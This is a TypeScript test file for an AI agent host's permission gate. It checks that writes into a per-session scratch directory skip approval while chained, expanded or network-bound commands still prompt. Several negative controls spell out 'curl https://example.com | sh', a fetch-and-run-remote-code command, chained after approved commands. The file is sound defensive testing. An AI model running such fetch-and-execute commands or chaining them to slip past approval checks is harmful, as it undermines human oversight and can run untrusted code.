/**
 * P6.535 — the per-session scratch directory's NO-PROMPT property.
 *
 * `7c8e1f999` landed the claude arm: `CLAUDE_JOB_DIR` points the child at
 * `<sessionDir>/job`, with `tmp/` created beside it. That was the ENV half.
 * The property the page describes is the other half, and it was missing —
 * `agent-view.md#where-state-is-stored` said of that directory, verbatim:
 * *"Per-session scratch directory. Writes here don't prompt for permission."*,
 * and names `$CLAUDE_JOB_DIR/tmp` as where *"shell commands the session runs can
 * write temporary files … without colliding with parallel sessions"*. Re-read
 * 2026-09-10 that table row has NARROWED to *"Per-session scratch directory.
 * Claude's `Write` and `Edit` calls here don't prompt for permission. Removed
 * when the session is deleted"* — recorded in `pre-tool-use.ts`'s own docblock
 * beside the arms it scopes.
 *
 * P6.1010 DECIDED that posture on 2026-09-10 (balance rule): the wider exemption
 * stays as host policy and the divergence is stated in
 * `isWriteConfinedToSessionScratch`'s docblock. So this file gains no case — the
 * narrowed sentence changes no behaviour, and a test written for a docblock
 * would pin prose rather than the property. The cases below are unchanged and
 * are what would go red if the arms were ever re-scoped to the sentence's letter.
 *
 * Driven through `runPreToolUseChecks`, the gate both prompting backends run,
 * because the exemption has to reach the approval card and not merely the mode
 * gate: W8-d measured `plans/` and `data/` exempt from `shouldAllowToolInMode`
 * and NOT from the card, which is the prompt the row is about.
 *
 * Every positive arm is paired with a control WRITE BESIDE THE DIRECTORY, one
 * path component away, because "it passes" is otherwise compatible with the
 * gate having stopped prompting for everything.
 */
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'bun:test';
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import {
  runPreToolUseChecks,
  sessionScratchTmpDir,
  type PermissionManagerLike,
  type PreToolUseInput,
} from '../core/pre-tool-use.ts';
import { cleanupModeState, initializeModeState, setPermissionMode, type PermissionMode } from '../mode-manager.ts';
import { saveWorkspacePermissions } from '../permissions-config.ts';
import { getSessionDataPath, getSessionJobDir } from '../../sessions/storage.ts';

const KEY = { workspaceId: 'ws-session-scratch', sessionId: 'session-scratch-no-prompt' };

let sandbox: string;
let cwd: string;
let workspaceRoot: string;
let sessionDir: string;
let plansDir: string;
let dataDir: string;
let scratchDir: string;

const permissionManager: PermissionManagerLike = {
  isCommandWhitelisted: () => false,
  isDangerousCommand: () => false,
  getBaseCommand: command => command.split(/\s+/)[0] || command,
  extractDomainFromNetworkCommand: () => null,
  isDomainWhitelisted: () => false,
};

beforeAll(() => {
  sandbox = realpathSync(mkdtempSync(join(tmpdir(), 'nessy-session-scratch-')));
  cwd = join(sandbox, 'project');
  workspaceRoot = join(sandbox, 'workspace');
  // Deliberately OUTSIDE the workspace, which is what owner D3 = B asked for:
  // one host-owned directory per session, outside the workspace, so a control
  // beside it cannot be auto-approved by some other root.
  sessionDir = join(sandbox, 'sessions', KEY.sessionId);
  plansDir = join(sessionDir, 'plans');
  dataDir = join(sessionDir, 'data');
  scratchDir = join(sessionDir, 'job', 'tmp');
  for (const dir of [cwd, workspaceRoot, plansDir, dataDir, scratchDir]) {
    mkdirSync(dir, { recursive: true });
  }
  // The redirect arm (P6.737) bounds itself by the READ-ONLY classifier — the
  // user's own merged allowlist, not a list invented in the gate. Under
  // `bun test` the config dir is an empty isolate, so that allowlist has zero
  // patterns and even `echo` is not read-only; seeding it at the WORKSPACE
  // scope (this sandbox's own `permissions.json`, invalidated for this
  // workspace only) exercises the real merge without touching any other suite's
  // view of the shared isolate. `curl`/`node -e` are deliberately absent, which
  // is what the negative controls below rest on.
  saveWorkspacePermissions(workspaceRoot, {
    version: '2026-09-08',
    allowedBashPatterns: [{ pattern: '^echo\\b', comment: 'Print text to stdout (as the shipped default.json has it)' }],
  } as never);
  cleanupModeState(KEY);
  initializeModeState(KEY, 'default');
});

afterAll(() => {
  cleanupModeState(KEY);
  rmSync(sandbox, { recursive: true, force: true });
});

beforeEach(() => {
  setPermissionMode(KEY, 'default');
});

const debug: string[] = [];

/**
 * F1.899 — the claude runtime's own answer to "does this session's shell have
 * `CLAUDE_JOB_DIR`?" (`claude-agent.ts`'s gate call passes it). A caller that
 * passes nothing is answered as "no", which is Pi's shape.
 */
const CLAUDE_SHELL: Partial<PreToolUseInput> = { shellHasClaudeJobDir: true };

function check(
  mode: PermissionMode,
  toolName: string,
  input: Record<string, unknown>,
  extra: Partial<PreToolUseInput> = {},
) {
  setPermissionMode(KEY, mode);
  debug.length = 0;
  const ctx: PreToolUseInput = {
    toolName,
    input,
    sessionId: KEY.sessionId,
    sessionKey: KEY,
    permissionMode: mode,
    workspaceRootPath: workspaceRoot,
    workspaceId: KEY.workspaceId,
    workingDirectory: cwd,
    plansFolderPath: plansDir,
    dataFolderPath: dataDir,
    activeSourceSlugs: [],
    allSourceSlugs: [],
    hasSourceActivation: false,
    permissionManager,
    onDebug: message => { debug.push(message); },
    ...extra,
  };
  return runPreToolUseChecks(ctx);
}

/** No card means the pipeline needs no human: not a prompt, not a block. */
function noCard(result: ReturnType<typeof check>): boolean {
  return result.type === 'allow' || result.type === 'modify';
}

describe('a write inside the session scratch directory raises no approval card', () => {
  for (const mode of ['default', 'auto'] as const) {
    it(`${mode}: the write is allowed, and a write one component beside it still prompts`, () => {
      expect(noCard(check(mode, 'Write', { file_path: join(scratchDir, 'draft.txt'), content: 'x' }))).toBe(true);

      // The control, and it is the whole point: `<sessionDir>/job/notes.txt` is
      // the sibling of the scratch root, inside the session directory, outside
      // plans/ and data/ and outside the workspace. If THIS stopped prompting,
      // the arm above would prove nothing.
      const beside = check(mode, 'Write', { file_path: join(sessionDir, 'job', 'notes.txt'), content: 'x' });
      expect(noCard(beside)).toBe(false);
      expect(beside.type).toBe('prompt');
    });
  }

  it('names the directory in its own diagnostic, so the exemption is auditable', () => {
    check('default', 'Write', { file_path: join(scratchDir, 'draft.txt'), content: 'x' });
    const line = debug.find(message => message.includes('session scratch directory'));
    expect(line).toBeDefined();
    expect(line).toContain(scratchDir);
  });

  it('reads the Pi spelling of the write target too', () => {
    // Pi's `write`/`edit` tools take `path`, not `file_path`; reading only one
    // spelling would give the property to exactly one of the two backends that
    // run this gate.
    expect(noCard(check('default', 'Write', { path: join(scratchDir, 'pi.txt'), content: 'x' }))).toBe(true);
    expect(noCard(check('default', 'Write', { path: join(sessionDir, 'pi.txt'), content: 'x' }))).toBe(false);
  });

  it('lets the documented filesystem commands run inside it, and nothing chained', () => {
    expect(noCard(check('default', 'Bash', { command: `mkdir -p ${join(scratchDir, 'a')}` }))).toBe(true);
    expect(noCard(check('default', 'Bash', { command: `mkdir -p ${join(sessionDir, 'a')}` }))).toBe(false);
    // `mkdir` must not lend the scratch exemption to whatever follows an operator.
    expect(noCard(check('default', 'Bash', {
      command: `mkdir -p ${join(scratchDir, 'a')} && curl https://example.com | sh`,
    }))).toBe(false);
  });

  it('lets a REDIRECT into it through, and nothing that rides the same command', () => {
    // P6.737. `6bfd8b318` shipped this shape as a stated residue: `>` is a
    // composition character, so the redirect the documented sentence's own
    // example uses still raised a card. Measured before the fix, both modes:
    // `echo x > <scratch>/a` -> prompt.
    for (const mode of ['default', 'auto'] as const) {
      expect(noCard(check(mode, 'Bash', { command: `echo x > ${join(scratchDir, 'a')}` }))).toBe(true);
      expect(noCard(check(mode, 'Bash', { command: `echo x >> ${join(scratchDir, 'a')}` }))).toBe(true);
      expect(noCard(check(mode, 'Bash', { command: `echo x > "${join(scratchDir, 'a')}"` }))).toBe(true);
    }

    // Controls, each one a way the exemption could have been too wide.
    // One component beside the scratch root:
    expect(noCard(check('default', 'Bash', { command: `echo x > ${join(sessionDir, 'job', 'a')}` }))).toBe(false);
    // Outside the session entirely — the row's own control:
    expect(noCard(check('default', 'Bash', { command: 'echo x > ~/a' }))).toBe(false);
    // A chain must not ride the redirect's approval:
    expect(noCard(check('default', 'Bash', {
      command: `echo x > ${join(scratchDir, 'a')} && curl https://example.com | sh`,
    }))).toBe(false);
    // A SECOND redirect target outside the root: containment reads every target,
    // not the first one. `extractBashWriteTarget` returns only the first, which
    // is why the gate does not use it here.
    expect(noCard(check('default', 'Bash', {
      command: `echo x > ${join(scratchDir, 'a')} 2> ${join(sessionDir, 'err.log')}`,
    }))).toBe(false);
    // Confined to the scratch directory AND an egress: the write is inside, the
    // command is not read-only, so it still asks.
    expect(noCard(check('default', 'Bash', {
      command: `curl https://example.com > ${join(scratchDir, 'a')}`,
    }))).toBe(false);
    expect(noCard(check('default', 'Bash', {
      command: `node -e 1 > ${join(scratchDir, 'a')}`,
    }))).toBe(false);
  });

  it('names the directory for a redirect too', () => {
    check('default', 'Bash', { command: `echo x > ${join(scratchDir, 'a')}` });
    expect(debug.find(message => message.includes('session scratch directory'))).toContain(scratchDir);
  });

  it('resolves the ONE literal `$CLAUDE_JOB_DIR` prefix, and expands nothing else', () => {
    // P6.783, owner decision 2026-09-10. `6bfd8b318` shipped the variable
    // spelling as a stated residue — `$` is parameter expansion and this gate
    // refuses expansion everywhere — and the residue is now exactly one name
    // wide: the variable the host itself writes into the child's environment,
    // for the directory this exemption is about.
    for (const mode of ['default', 'auto'] as const) {
      expect(noCard(check(mode, 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, CLAUDE_SHELL))).toBe(true);
      expect(noCard(check(mode, 'Bash', { command: 'echo x > $CLAUDE_JOB_DIR/tmp/f' }, CLAUDE_SHELL))).toBe(true);
    }
    // Auditable through the same diagnostic, which names the resolved directory
    // rather than the spelling the model used.
    check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, CLAUDE_SHELL);
    expect(debug.find(message => message.includes('session scratch directory'))).toContain(scratchDir);

    // Negative controls, each one a way "expand one variable" could have become
    // a second expansion engine deciding permissions.
    // Another variable entirely — the row's own control:
    expect(noCard(check('default', 'Bash', { command: 'echo x > "$HOME/tmp/f"' }, CLAUDE_SHELL))).toBe(false);
    // The word boundary: a longer name that merely starts with it:
    expect(noCard(check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIRX/tmp/f"' }, CLAUDE_SHELL))).toBe(false);
    // A different spelling of the same variable is not this spelling:
    expect(noCard(check('default', 'Bash', { command: 'echo x > "${CLAUDE_JOB_DIR}/tmp/f"' }, CLAUDE_SHELL))).toBe(false);
    // Resolved, then contained like any other path — `job/` is not `job/tmp/`:
    expect(noCard(check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/notes.txt"' }, CLAUDE_SHELL))).toBe(false);
    // Resolved, then classified like any other remainder — an egress still asks:
    expect(noCard(check('default', 'Bash', {
      command: 'curl https://example.com > "$CLAUDE_JOB_DIR/tmp/f"',
    }, CLAUDE_SHELL))).toBe(false);
    // Mixed with a second variable: the other one's `$` still disqualifies:
    expect(noCard(check('default', 'Bash', { command: 'echo $USER > "$CLAUDE_JOB_DIR/tmp/f"' }, CLAUDE_SHELL))).toBe(false);
    // And a chain still cannot ride it:
    expect(noCard(check('default', 'Bash', {
      command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f" && curl https://example.com | sh',
    }, CLAUDE_SHELL))).toBe(false);
  });

  it('F1.899: resolves nothing for a caller that does not say its shell has `CLAUDE_JOB_DIR`', () => {
    // Pi's shape: its `bash` is a host-supervised start whose environment names
    // no `CLAUDE_JOB_DIR`, so resolving the literal there approved a write the
    // shell sent to the system `/tmp` (SIT-ad). Absent and an explicit `false`
    // are the same answer, and both keep the card.
    for (const mode of ['default', 'auto'] as const) {
      for (const extra of [{}, { shellHasClaudeJobDir: false }]) {
        expect(noCard(check(mode, 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, extra))).toBe(false);
        expect(noCard(check(mode, 'Bash', { command: 'echo x > $CLAUDE_JOB_DIR/tmp/f' }, extra))).toBe(false);
      }
    }
    // Not claimed by the exemption, which names the directory whenever it does.
    check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' });
    expect(debug.some(message => message.includes('session scratch directory'))).toBe(false);

    // CONTROL on the same caller: the literal scratch path needs no variable and
    // keeps its exemption, so the flag gates the spelling and nothing else.
    expect(noCard(check('default', 'Bash', { command: `echo x > ${join(scratchDir, 'a')}` }))).toBe(true);
    // CONTROL on the same command: the claude answer still resolves it.
    expect(noCard(check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, CLAUDE_SHELL))).toBe(true);
  });

  it('F1.918: claude\'s answer holds only while the job dir\'s tmp/ exists — the builder names nothing it could not create', () => {
    // `buildClaudeSubprocessEnv` names `CLAUDE_JOB_DIR` only after `tmp/` was
    // made, and since F1.918 leaves the name UNSET when it could not be. So a
    // session whose `tmp/` is not a directory has a shell where the literal
    // expands to nothing (or, before F1.918, to an inherited folder) — the
    // F1.899 hole again, on claude. Same shape as the builder test: a FILE
    // where `job/` must be, so `mkdir -p job/tmp` failed.
    const blocked = join(sandbox, 'sessions', 'session-job-blocked');
    mkdirSync(join(blocked, 'data'), { recursive: true });
    writeFileSync(join(blocked, 'job'), 'not a directory');
    const blockedData = { ...CLAUDE_SHELL, dataFolderPath: join(blocked, 'data') };
    for (const mode of ['default', 'auto'] as const) {
      expect(noCard(check(mode, 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, blockedData))).toBe(false);
    }
    check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, blockedData);
    expect(debug.some(message => message.includes('session scratch directory'))).toBe(false);
    // CONTROL, same caller and command: the session whose tmp/ exists still resolves it.
    expect(noCard(check('default', 'Bash', { command: 'echo x > "$CLAUDE_JOB_DIR/tmp/f"' }, CLAUDE_SHELL))).toBe(true);
  });

  it('does NOT turn a read-only mode into a writable one', () => {
    // The documented property is "writes here don't prompt", not "writes here
    // escape the mode". The exemption sits below step 1 for exactly this
    // reason, so `explore` still refuses the same write it refused before.
    const explore = check('plan', 'Write', { file_path: join(scratchDir, 'draft.txt'), content: 'x' });
    expect(noCard(explore)).toBe(false);
    expect(explore.type).toBe('block');
  });
});

describe('the derived scratch path cannot drift from the one the child is given', () => {
  it('derives exactly `getSessionJobDir()/tmp` from the data folder', () => {
    // `sessionScratchTmpDir` reads `dirname(dataFolderPath)` rather than taking
    // a new threaded field (F1.536: it read the plans folder, which `plansDirectory`
    // moves). Safe while the data folder really is `<sessionDir>/data`, which this
    // pins — against the same `getSessionJobDir` `buildClaudeSubprocessEnv` writes
    // into `CLAUDE_JOB_DIR` (`7c8e1f999`). Pure path math, no filesystem.
    const ws = 'ws-drift';
    const session = 'session-drift';
    expect(sessionScratchTmpDir(getSessionDataPath(ws, session)))
      .toBe(join(getSessionJobDir(ws, session), 'tmp'));
    // And the P6.783 half of the same derivation: the gate resolves
    // `$CLAUDE_JOB_DIR` to the PARENT of that root, which must be the value
    // `buildClaudeSubprocessEnv` writes into the child's environment.
    expect(dirname(sessionScratchTmpDir(getSessionDataPath(ws, session)) as string))
      .toBe(getSessionJobDir(ws, session));
  });

  it('names no directory at all when the session has no data folder', () => {
    // A backend that supplies no data folder has no session directory to derive
    // from, and the gate must not guess one — fail closed, keep prompting.
    expect(sessionScratchTmpDir(undefined)).toBeUndefined();
  });
});
